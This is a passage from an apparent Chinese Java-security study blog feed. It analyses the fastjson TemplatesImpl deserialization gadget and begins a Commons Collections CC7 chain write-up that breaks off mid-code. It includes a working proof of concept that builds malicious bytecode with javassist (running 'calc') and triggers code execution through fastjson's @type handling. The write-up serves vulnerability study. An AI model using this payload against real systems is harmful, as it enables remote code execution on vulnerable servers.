title="0x04、fastjson-TemplatesImpl利用分析"></a>0x04、fastjson-TemplatesImpl利用分析</h1><p>只有正向分析了解执行过程了，逆向分析思路实在难理</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>参考网上的POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clas</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//clas.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">EvilCode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="comment">//System.out.println(EvilCode);</span></span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GADGAT_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil</span> <span class="operator">=</span> Payload.generateEvil();</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>+<span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前半段就是<code>javassist</code>字节码生成恶意代码，在上面<code>ClassLoader</code>和<code>TemplatesImpl</code>分析的时候提过了，区别就是生成的恶意字节码经过<code>Base64</code>编码过一次，为什么会经过<code>Base64</code>编码，分析过程去了解。</p><p>下半段主程序就是<code>fastjson</code>反序列化<code>TemplatesImpl</code>类，加载恶意字节码，同时添加<code>TemplatesImpl</code>执行需要满足的几个条件属性，最后添加<code>_outputProperties</code>字段目的经过转换调用<code>getoutputProperties()</code>方法执行恶意代码，后面又加了一个<code>_name</code>参数和<code>allowedProtocols</code>参数。</p><p>最后在<code>parseObject</code>反序列化的时候添加了<code>Feature.SupportNonPublicField</code>参数，突破访问私有属性限制，因为<code>TemplatesImpl</code>类大部分属性都是<code>private</code>保护属性，fastjson默认无法序列化保护属性的变量。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>调试首先进入对应参数类型的<code>parseObject</code>方法<br><img src="/posts/ad3be047/fj1-16.png" title="parseObject方法"></p><p>判断input输入是否为空，然后创建默认<code>JSONparser</code>解析器<br><img src="/posts/ad3be047/fj1-17.png" title="JSONparser"></p><p>跟进<code>DefaultJSONParser</code>方法，先通过分词器(laxer,用于对input值进行符号分割，获取对应的截选字段)获取开头字符是否是”{“</p><p><img src="/posts/ad3be047/fj1-18.png" title="JSONparser"></p><p>是的话，就设置<code>token</code>为<code>JSONtoken.LBRACE</code>，值为12</p><p><img src="/posts/ad3be047/fj1-19.png" title="token"></p><p>然后对解析器<code>parser</code>进行<code>parseObject</code>序列化操作，<code>Type</code>对象为输入的<code>Object.class</code>对象</p><p><img src="/posts/ad3be047/fj1-20.png" title="parseObject"></p><p>跟进<code>parseObject</code>方法，判断<code>token</code>所属类型，然后获取反序列化解析器</p><p><img src="/posts/ad3be047/fj1-21.png" title="parseObject"><br><img src="/posts/ad3be047/fj1-22.png" title="getDeserializer"></p><p>跟进<code>getDeserializer</code>方法，根据Type（即输入的<code>Object.class</code>对象）获取对应的反序列化器，获取的反序列化器为<code>JavaObjectDeserializer</code></p><p><img src="/posts/ad3be047/fj1-23.png" title="getDeserializer"><br><img src="/posts/ad3be047/fj1-24.png" title="getDeserializer"></p><p>获取反序列化器后，判断对象类型后，对反序列化器进行反序列化操作。</p><p><img src="/posts/ad3be047/fj1-25.png" title="parse"></p><p>跟进<code>parse</code>方法</p><p><img src="/posts/ad3be047/fj1-26.png" title="parse"></p><p>通过<code>Token</code>判断后进入判断体分支，创建新的<code>json</code>对象，然后对该<code>json</code>对象和<code>fieldName</code>字段（当前类对象为Object，没有解析字段，所以值为null）进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-27.png" title="parse"></p><p>再次跟进<code>parseObject</code>方法</p><p>前面的一大段操作都是通过分词器<code>laxer</code>获取的字符进行判断是否合法</p><p><img src="/posts/ad3be047/fj1-28.png" title="input合法判断"></p><p>一直到key值的判断，key为获取的<code>@type</code>，typeName为<code>@type</code>的值即输入的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p><img src="/posts/ad3be047/fj1-29.png" title="key判断"></p><p>通过加载类获取一个<code>TemplatesImpl</code>类对象<code>clazz</code></p><p><img src="/posts/ad3be047/fj1-30.png" title="获取TemplatesImpl类对象"></p><p>获取<code>TemplatesImpl</code>类对象后，再次寻找对应的反序列化器</p><p><img src="/posts/ad3be047/fj1-31.png" title="获取TemplatesImpl类对象"></p><p>由于<code>TemplatesImpl</code>类并不在<code>derializers</code>的列表中，因此<code>derializer</code>为<code>null</code>，<code>derializer</code>列表大部分为<code>hashmap</code></p><p><img src="/posts/ad3be047/fj1-32.png" title="derializer为null"></p><p>但<code>type(TemplatesImpl)</code>属于<code>Class</code>，因此进入另一个获取反序列化器的方法<code>getDeserializer((Class&lt;?&gt;) type, type)</code>，继续跟进<code>getDeserializer</code>方法<br>前半段依旧是获取<code>type</code>的反序列化器，同样<code>derializer</code>还是为<code>null</code></p><p><img src="/posts/ad3be047/fj1-33.png" title="getDeserializer"></p><p>不同上一个获取反序列化器的方法，接下来获取clazz的类名即（com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl），然后判断该类名是否是黑名单（java.lang.Thread）中的内容</p><p><img src="/posts/ad3be047/fj1-34.png" title="黑名单判断"></p><p>后面就是对<code>className</code>进行分类判断，最后没有找到对应类的反序列化器，最后通过<code>createJavaBeanDeserializer</code>方法对当前<code>clazz</code>创建一个反序列化器</p><p><img src="/posts/ad3be047/fj1-35.png" title="createJavaBeanDeserializer"></p><p>跟进<code>createJavaBeanDeserializer</code>方法，其中<code>asmEnable</code>默认开启，然后判断<code>clazz</code>类是否支持字节码操作，然后进行<code>JavaBeanInfo</code>创建</p><p><img src="/posts/ad3be047/fj1-36.png" title="JavaBeanInfo"></p><p>在<code>setter/getter</code>分析中提到的<code>build</code>方法主要是通过反射遍历获取类中的方法名和数据保存在<code>Fieldlist</code>中然后放入<code>beaninfo</code>数组中。</p><p><img src="/posts/ad3be047/fj1-14.png" title="beaninfo"></p><p><code>beaninfo</code>创建后，后面的代码部分就是针对<code>Beaninfo</code>的字段属性进行循环遍历检查合法性，属性查询完后，创建<code>JavaBeanDeserializer</code>反序列化器</p><p><img src="/posts/ad3be047/fj1-37.png" title="JavaBeanDeserializer"><br><img src="/posts/ad3be047/fj1-38.png" title="JavaBeanDeserializer"></p><p><code>JavaBeanDeserializer</code>方法中先是声明<code>beanInfo.sortedFields</code>的<code>FieldDeserializer</code>反序列化器，然后循环读取<code>sortedFields</code>排序后的属性给<code>fieldInfo</code>变量，然后创建新的字段反序列化器<code>createFieldDeserializer</code>，最后新反序列化器放入<code>sortedFieldDeserializers</code>数组中</p><p><img src="/posts/ad3be047/fj1-39.png" title="sortedFieldDeserializers"></p><p>后半段是循环获取<code>beanInfo.fields</code>的属性，然后通过<code>getFieldDeserializer</code>方法在<code>sortedFieldDeserializers</code>数组中查找是否匹配，匹配的话就放入到<code>fieldDeserializers</code>数组当中。</p><p><img src="/posts/ad3be047/fj1-40.png" title="sortedFieldDeserializers"></p><p>到此，<code>JavaBeanDeserializer</code>反序列化器创建成功，并放入到反序列化器当中，最后返回反序列化器<code>derializer</code></p><p><img src="/posts/ad3be047/fj1-41.png" title="derializer"></p><p>获取到反序列化器后，正式对该反序列化器进行反序列化操作</p><p><img src="/posts/ad3be047/fj1-42.png" title="derialize"></p><p>反序列化的前半部分都是对类的一些属性信息进行判断（<code>token</code>的判断，<code>laxer</code>分词器的创建等）</p><p><img src="/posts/ad3be047/fj1-43.png" title="derialize"></p><p>通过循环读取<code>sortedFieldDeserializers</code>数组获取反序列化器中的属性数据，获取过后再循环判断获取的类的分类所属，在进行对应类属性赋值</p><p><img src="/posts/ad3be047/fj1-44.png" title="sortedFieldDeserializers"></p><p>经过上面的对<code>sortedFieldDeserializers</code>获取的当前属性信息的操作后，创建对解析器对象进行实例化</p><p><img src="/posts/ad3be047/fj1-45.png" title="createInstance"><br><img src="/posts/ad3be047/fj1-46.png" title="实例化对象"></p><p>实例化对象后，开始解析该对象在解析器中的字段属性</p><p><img src="/posts/ad3be047/fj1-47.png" title="解析字段属性"></p><p>字段反序列化器会模糊匹配<code>key</code>，跟进<code>smartMatch</code>方法</p><p><img src="/posts/ad3be047/fj1-48.png" title="smartMatch"></p><p>先判断<code>Key</code>是否存在，存在然后通过<code>getFieldDeserializer</code>方法查找<code>key</code>的反序列化器，如果找不到该<code>key</code>的反序列化器，然后判断<code>key</code>是否以<code>is</code>为开头，随后循环获取<code>sortedFieldDeserializers</code>数组内容获取其中的<code>fieldInfo、fieldClass、fieldName</code>等属性</p><p><img src="/posts/ad3be047/fj1-49.png" title="smartMatch"></p><p>因为在<code>getFieldDeserializer</code>中匹配<code>Key</code>是否在<code>sortedFieldDeserializers</code>数组中，由于数组中的值没有”_”开头，因此找不到<code>key</code>的反序列化器</p><p><img src="/posts/ad3be047/fj1-50.png" title="getFieldDeserializer"></p><p>条件都不满足，找不到<code>FieldDeserializer</code>属性反序列化器，然后就对属性进行字符替换操作，此时的<code>Key</code>由<code>&quot;_outputProperties&quot;</code>被替换成<code>&quot;outputProperties&quot;</code></p><p><img src="/posts/ad3be047/fj1-51.png" title="replaceAll"><br><img src="/posts/ad3be047/fj1-52.png" title="replaceAll"></p><p>然后再次调用<code>getFieldDeserializer</code>方法，查询是否存在<code>key2</code>的反序列化器，此时<code>sortedFieldDeserializers</code>数组中存在<code>outputProperties</code>字段，因此能够找到反序列化器</p><p><img src="/posts/ad3be047/fj1-54.png" title="getFieldDeserializer"><br><img src="/posts/ad3be047/fj1-55.png" title="outputProperties"></p><p>返回属性反序列化器，此时获取到<code>getoutputProperties</code>方法（build中提到的getter&#x2F;setter建立会存储get和set方法，反序列化器查询匹配到字段后会返回该方法的反序列化器）</p><p><img src="/posts/ad3be047/fj1-56.png" title="getoutputProperties"></p><p>找到属性反序列化器后，对该属性进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-57.png" title="parseField"></p><p>解析过程中通过<code>getFieldValueDeserilizer</code>方法获取属性值的反序列化器，并对属性值反序列化器进行反序列化解析获取值</p><p><img src="/posts/ad3be047/fj1-58.png" title="getFieldValueDeserilizer"></p><p>然后将获取的值通过<code>setValue</code>方法赋值给字段属性</p><p><img src="/posts/ad3be047/fj1-59.png" title="setValue"></p><p>跟进<code>setValue</code>方法，通过反射获取字段属性的方法</p><p><img src="/posts/ad3be047/fj1-60.png" title="setValue"></p><p>最后通过反射执行<code>Object</code>对象的<code>Method</code>方法，即执行<code>TemplatesImpl.getoutputProperties()</code>,触发漏洞</p><p><img src="/posts/ad3be047/fj1-61.png" title="反射执行方法"><br><img src="/posts/ad3be047/fj1-62.png" title="触发漏洞"></p><h2 id="base64编码问题"><a href="#base64编码问题" class="headerlink" title="base64编码问题"></a>base64编码问题</h2><p>在解析字段属性中，解析到<code>&quot;_bytecodes&quot;</code></p><p><img src="/posts/ad3be047/fj1-63.png" title="_bytecodes解析"></p><p>然后获取对应反序列化器，对反序列化器进行再次解析</p><p><img src="/posts/ad3be047/fj1-64.png" title="反序列化器解析"></p><p>再次跟进，此时属性反序列化器为<code>ObjectArrayCodec</code>，调用<code>ObjectArrayCodec</code>的反序列化方法<code>deserialze</code></p><p><img src="/posts/ad3be047/fj1-65.png" title="反序列化器解析"></p><p>过程中会对参数内容集合进行解析</p><p><img src="/posts/ad3be047/fj1-66.png" title="反序列化器解析"></p><p>进入对集合进行解析，此时<code>laxer</code>经过<code>nexttoken()</code>方法后重新赋值，再次对<code>value</code>进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-69.png" title="deserialze"></p><p>跟进反序列化方法，此时<code>laxer</code>匹配<code>JSONToken.LITERAL_STRING</code>，调用<code>bytesValue()</code>方法</p><p><img src="/posts/ad3be047/fj1-67.png" title="解析字段"></p><p>跟进<code>bytesValue()</code>方法，在这里对<code>txt</code>也就是<code>Input</code>的内容进行<code>base64</code>解码，所以<code>_bytecodes</code>需要经过base64编码</p><p><img src="/posts/ad3be047/fj1-68.png" title="base64解码"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>跟完TemplatesImpl链，头都大了，总的来说就是通过创建序列化器去存储序列化对象的相关信息，再通过反序列化器解析反序列化类对象、类字段、方法等信息，最后再解析反序列化器。跟一遍下来的感觉就是不停的创建反序列化器，再解析反序列化器的内容，结合getter触发代码执行，虽然绕了很多，但在这里面也学到了很多，理解的过程也不完全，很多细节上的代码段也没理解透意思，就在大体框架走了一遍，可能还存在一些理解错误的地方，后面遇到了再改吧。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a><br><a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a><br><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb">https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb</a><br><a href="https://y4er.com/posts/fastjson-learn/">https://y4er.com/posts/fastjson-learn/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC7链学习与分析</title>
      <link href="/posts/40ba40f0.html"/>
      <url>/posts/40ba40f0.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC7的触发点同CC1一样，采用ChainedTransformer链和LazyMap类，入口点变了，跟前面CC1~6不一样，但逆向思维去分析查找链实在没办法，效果跟正向分析没啥区别了，所以主要以正向分析去学习，还是单独整理出来吧</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC7链也利用<code>ChainedTransformer</code>链和<code>LazyMap</code>类作为触发点，入口不一样，目的都是为了调用<code>lazyMap.get()</code>方法</p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>回顾LazyMap触发点：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li><code>lazyMap.get()</code>方法会调用<code>ChainedTransformer.transform()</code>执行链转换器内的<code>Runtime.exec()</code>方法达到命令执行的目的。</li></ul><hr><p>CC1~6中使用到LazyMap的链：<br>CC1（LazyMap链）：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将<code>LazyMap</code>对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><hr><p>CC5：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.toString()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li><li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li></ul><hr><p>CC6：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.hashCode()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>通过使用<code>hashmap</code>的<code>put</code>方法添加元素时调用<code>hash(key)</code>方法，进而调用<code>key.hashCode()</code>方法，将<code>TiedMapEntry</code>对象作为key<code>put</code>入<code>hashmap</code>中，达到调用<code>TiedMapEntry.hashCode()</code>的目的（hashSet同理,本质上都是调用hashmap）。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>回到<code>lazyMap.get()</code>方法本身上来，CC7使用了<code>Hashtable</code>作为入口，也就是说对<code>Hashtable</code>对象进行序列化，然后在反序列化时触发漏洞</p><p>简述Hashtable哈希表:</p><blockquote><p>Hashtable是原始的java.util的一部分， 是一个Dictionary具体的实现 。<br>然而，Java 2 重构的Hashtable实现了Map接口，因此，Hashtable现在集成到了集合框架中。它和HashMap类很相似，但是它支持同步。<br>像HashMap一样，Hashtable在哈希表中存储键&#x2F;值对。当使用一个哈希表，要指定用作键的对象，以及要链接到该键的值。<br>然后，该键经过哈希处理，所得到的散列码被用作存储在该表中值的索引。</p></blockquote><p>同<code>hashmap</code>一样，都是存储键值对&lt;key,value&gt;的散列表。</p><p><code>Hashtable</code>同样重写了序列化和反序列化过程</p><h3 id="hashtable反序列化过程"><a href="#hashtable反序列化过程" class="headerlink" title="hashtable反序列化过程"></a>hashtable反序列化过程</h3><hr><p>序列化（writeObject）过程，其实查看英文注解就大概知道这个过程了:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//声明一个Entry变量，用来临时存储读取的数据</span></span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="comment">//默认写入非static和transient的属性</span></span><br><span class="line">            <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入table表的长度和元素数量</span></span><br><span class="line">            <span class="comment">// Write out length, count of elements</span></span><br><span class="line">            s.writeInt(table.length);</span><br><span class="line">            s.writeInt(count);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//依次读取table表中的键值对，写入到entryStack变量中</span></span><br><span class="line">            <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//依次读取entryStack变量中数据，将entry里的Key和value写入</span></span><br><span class="line">        <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>序列化过程简单来说就是创建一个<code>Entry</code>类型变量<code>entryStack</code>来读取<code>table</code>中的<code>entry</code>数据，再依次读取<code>entryStack</code>中的<code>entry</code>元素中的<code>key</code>和<code>value</code>写入到流中。</p><hr><p>反序列化（readObject）过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//读取默认属性</span></span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取原始table长度和元素成员数量</span></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//重新计算table的长度</span></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        <span class="comment">//创建计算好长度的table表</span></span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取流中所有元素的key和value</span></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">//同步将key和value通过reconstitutionPut方法写入到新创建的table表中</span></span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化过程相对也比较好理解，主要就是从流中读取到原始信息，再重新计算长度去创建一个新<code>table</code>表，并读取流中<code>key</code>和<code>value</code>通过<code>reconstitutionPut</code>方法写入到<code>table</code>表中<br>反序列化过程主要只调用了<code>reconstitutionPut</code>方法，该方法比较关键，再跟进<code>reconstitutionPut</code>方法</p><h3 id="reconstitutionPut"><a href="#reconstitutionPut" class="headerlink" title="reconstitutionPut()"></a>reconstitutionPut()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span 